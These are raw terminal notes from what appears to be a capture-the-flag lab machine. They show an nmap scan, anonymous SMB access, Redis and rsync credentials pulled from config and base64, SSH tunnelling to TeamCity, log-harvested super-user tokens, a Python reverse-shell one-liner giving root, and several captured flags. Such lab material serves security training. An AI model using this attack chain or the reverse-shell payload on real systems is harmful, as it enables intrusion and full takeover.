ser@rk-laptop:~/Documents/ctf/vulnnetinternal$ nmap -sC -sV 10.48.134.254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-18 09:54 IST
Nmap scan report for 10.48.134.254
Host is up (0.027s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:a1:bc:00:ef:3f:7d:c0:a6:27:86:86:c9:8d:c8:b5 (RSA)
|   256 2d:9d:45:c7:4d:b8:19:10:45:91:b1:55:cb:ce:87:36 (ECDSA)
|_  256 1f:98:97:05:a9:0b:58:b2:e1:ef:6e:84:9c:d6:d7:79 (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open     netbios-ssn Samba smbd 4.6.2
445/tcp  open     netbios-ssn Samba smbd 4.6.2
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs         3-4 (RPC #100003)
9090/tcp filtered zeus-admin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-18T04:24:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds


user@rk-laptop:~/Documents/ctf/vulnnetinternal$ smbclient -N -L ////10.48.134.254

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (ip-10-48-134-254 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available


ser@rk-laptop:~/Documents/ctf/vulnnetinternal$ smbclient -N \\\\10.48.134.254\\shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021

		15376180 blocks of size 1024. 2145428 blocks available
smb: \> cd data\
smb: \data\> mget *
Get file data.txt? y
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get file business-req.txt? y
getting file \data\business-req.txt of size 190 as business-req.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \data\> 
smb: \data\> cd ../temp\
smb: \temp\> mget *
Get file services.txt? y
getting file \temp\services.txt of size 38 as services.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\> 
smb: \temp\> 




user@rk-laptop:/mnt$ grep requirepass redis/redis.conf 
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"



user@rk-laptop:/mnt$ redis-cli -h 10.48.134.254 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.48.134.254:6379> help
redis-cli 7.0.15
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
10.48.134.254:6379> keys *
1) "int"
2) "tmp"
3) "internal flag"
4) "authlist"
5) "marketlist"
10.48.134.254:6379>
10.48.134.254:6379> help get

  GET key
  summary: Get the value of a key
  since: 1.0.0
  group: string

10.48.134.254:6379> keys *
1) "int"
2) "tmp"
3) "internal flag"
4) "authlist"
5) "marketlist"
10.48.134.254:6379> 
10.48.134.254:6379> get int
"10 20 30 40 50"
10.48.134.254:6379> get tmp
"temp dir..."
10.48.134.254:6379> get internal flag
(error) ERR wrong number of arguments for 'get' command
10.48.134.254:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.48.134.254:6379> 
10.48.134.254:6379> get authlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.48.134.254:6379> get marketlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.48.134.254:6379> 

10.48.134.254:6379> lrange marketlist 0 20
1) "Machine Learning"
2) "Penetration Testing"
3) "Programming"
4) "Data Analysis"
5) "Analytics"
6) "Marketing"
7) "Media Streaming"
10.48.134.254:6379> 
10.48.134.254:6379> lrange authlist 0 20
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="



user@rk-laptop:/mnt$ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

ser@rk-laptop:~/Documents/ctf/vulnnetinternal$ rsync -av rsync://rsync-connect@10.48.134.254/files/sys-internal/user.txt
Password: 
receiving incremental file list
-rw-------             38 2021/02/06 17:24:25 user.txt

sent 20 bytes  received 49 bytes  19.71 bytes/sec
total size is 38  speedup is 0.55



user@rk-laptop:~$ ssh -i int -L 8111:127.0.0.1:8111 sys-internal@10.48.134.254
sys-internal@ip-10-48-134-254:~$ 


sys-internal@ip-10-48-176-0:/TeamCity/logs$ grep -iR "password" catalina.out 2>/dev/null 
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8494139184482786852 (use empty username with the token as the password to access the server)



python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",1234));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'


sys-internal@ip-10-48-176-0:~$ nc -vlp 1234
nc: getnameinfo: Temporary failure in name resolution
sys-internal@ip-10-48-176-0:~$ nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.48.176.0 49378
/bin/sh: 0: can't access tty; job control turned off
# pd
/bin/sh: 1: pd: not found
# pwd
/TeamCity/buildAgent/work/2b35ac7e0452d98f
# whoami
root
# cd /root 
# ls
root.txt
# cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
